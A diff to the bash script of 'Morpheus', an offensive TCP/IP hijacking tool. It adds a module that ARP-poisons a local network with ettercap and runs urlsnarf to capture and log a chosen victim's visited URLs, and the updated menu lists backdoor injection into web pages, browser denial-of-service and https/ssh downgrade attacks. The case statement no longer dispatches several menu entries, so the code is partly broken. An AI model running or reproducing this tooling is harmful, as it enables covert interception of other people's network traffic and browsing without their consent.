@@ -9,7 +9,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 34 85 > /dev/null
+resize -s 35 85 > /dev/null
 # inicio
 
 
@@ -1065,11 +1065,87 @@ fi
 
 
 
+# -----------------------------------------------
+# CAPTURE TARGET BROWSING HISTORY [URL's VISITED]
+# -----------------------------------------------
+sh_stage9 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}  This module will capture target browsing surfing [url visited]  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  and display then with the help of urlsnarf, this module will    ${BlueF}|"
+echo "${BlueF}    | ${YellowF}    also store urls visited into morpheus/logs/grab_hosts.log     ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+rm $IPATH/logs/grab_hosts.log > /dev/null 2>&1
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+
+
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  sleep 1
+  # backup all files needed.
+  cd $IPATH/bin
+  cp $IPATH/filters/grab_hosts.eft $IPATH/filters/grab_hosts.rb > /dev/null 2>&1 # backup
+  # use SED bash command
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
+  cd $IPATH
+  sleep 1
+
+  # compiling UserAgent.eft to be used in ettercap
+  echo ${BlueF}[☠]${white} Compiling grab_hosts.eft${RedF}!${Reset};
+  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/grab_hosts.eft -o $IPATH/output/grab_hosts.ef && sleep 3"
+  sleep 1
+
+      # run mitm+filter
+      cd $IPATH/logs
+      echo ${BlueF}[☠]${white} Please wait, Capturing traffic${RedF}!${Reset};
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+      echo ${RedF}
+        urlsnarf -i $InT3R | cut -d\" -f4 & xterm -T "MORPHEUS - browsing capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost// /$gateway//"
+      else
+      echo ${RedF}
+        urlsnarf -i $InT3R | cut -d\" -f4 & xterm -T "MORPHEUS - browsing capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost/ /$gateway/"
+      fi
+
+  # display captured brosing hitory to user
+  HoSt=`cat $IPATH/logs/grab_hosts.log | grep "Host:"` > /dev/null 2>&1
+  echo ""
+  echo "${BlueF}[☠]${white} host:${YellowF}$UpL ${white}browsing history stored${RedF}!"
+  echo "${BlueF}[☠]${white} Please check: morpheus/logs/grab_hosts.log${RedF}!"
+  sleep 3
+
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1 # backup
+  rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
+  cd $IPATH
+  sleep 2
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+
 
 # --------------------------------
 # INJECT IMAGE INTO TARGET WEBSITE
 # --------------------------------
-sh_stage9 () {
+sh_stage10 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This filter will substitute the html tag '<img src=>'         ${BlueF}|"
@@ -1366,11 +1442,12 @@ cat << !
     |   6    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
     |   7    -  Firefox denial-of-service        [ firefox =< 49.0.1  ] |
     |   8    -  Android denial-of-service        [ android browsers   ] |
-    |   9    -  Replace website images           [ img src=http://www ] |
-    |  10    -  Replace website text             [ replace: worlds    ] |
-    |  11    -  Rotate website document 180º     [ CSS3 injection     ] |
-    |  12    -  https downgrade attack (demo)    [ replace: https     ] |
-    |  13    -  ssh downgrade attack (demo)      [ replace: SSH-1.99  ] |
+    |   9    -  Capture browser traffic          [ visited url's      ] |
+    |  10    -  Replace website images           [ img src=http://www ] |
+    |  11    -  Replace website text             [ replace: worlds    ] |
+    |  12    -  Rotate website document 180º     [ CSS3 injection     ] |
+    |  13    -  https downgrade attack (demo)    [ replace: https     ] |
+    |  14    -  ssh downgrade attack (demo)      [ replace: SSH-1.99  ] |
     |                                                                   |
     |   W    -  Write your own filter            [ use morpheus tool  ] |
     |   S    -  Scan LAN for live hosts          [ use nmap framework ] |
@@ -1392,8 +1469,7 @@ case $choice in
 6) sh_stage6 ;;
 7) sh_stage7 ;;
 8) sh_stage8 ;;
-10) sh_stage10 ;;
-11) sh_stage11 ;;
+9) sh_stage9 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
 S) sh_stageS ;;
